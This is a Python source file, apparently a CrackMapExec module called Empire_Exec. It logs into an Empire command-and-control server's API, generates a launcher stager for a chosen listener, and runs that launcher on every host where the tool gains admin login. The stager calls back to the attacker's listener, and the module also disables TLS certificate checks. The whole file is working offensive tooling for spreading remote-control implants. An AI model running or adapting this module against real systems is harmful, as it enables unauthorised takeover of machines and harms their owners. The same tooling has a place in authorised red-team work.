import sys
import requests
from requests import ConnectionError

#The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
requests.packages.urllib3.disable_warnings()

class CMEModule:
    '''
        Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
        Module by @byt3bl33d3r
    '''

    name='Empire_Exec'

    def options(self, context, module_options):
        '''
            LISTENER    Listener name to generate the launcher for
        '''

        if not 'LISTENER' in module_options:
            context.log.error('LISTENER option is required!')
            sys.exit(1)

        self.empire_launcher = None

        headers = {'Content-Type': 'application/json'}

        #Pull the username and password from the config file
        payload = {'username': context.conf.get('Empire', 'username'), 
                   'password': context.conf.get('Empire', 'password')}

        #Pull the host and port from the config file
        base_url = 'https://{}:{}'.format(context.conf.get('Empire', 'api_host'), context.conf.get('Empire', 'api_port'))

        try:
            r = requests.post(base_url + '/api/admin/login', json=payload, headers=headers, verify=False)
            if r.status_code == 200:
                token = r.json()['token']

                payload = {'StagerName': 'launcher', 'Listener': module_options['LISTENER']}
                r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=payload, headers=headers, verify=False)
                self.empire_launcher = r.json()['launcher']['Output']

                context.log.success("Successfully generated launcher for listener '{}'".format(module_options['LISTENER']))
            else:
                context.log.error("Error authenticating to Empire's RESTful API server!")
                sys.exit(1)

        except ConnectionError as e:
            context.log.error("Unable to connect to Empire's RESTful API: {}".format(e))
            sys.exit(1)

    def on_admin_login(self, context, connection):
        if self.empire_launcher:
            connection.execute(self.empire_launcher)
            context.log.success('Executed Empire Launcher')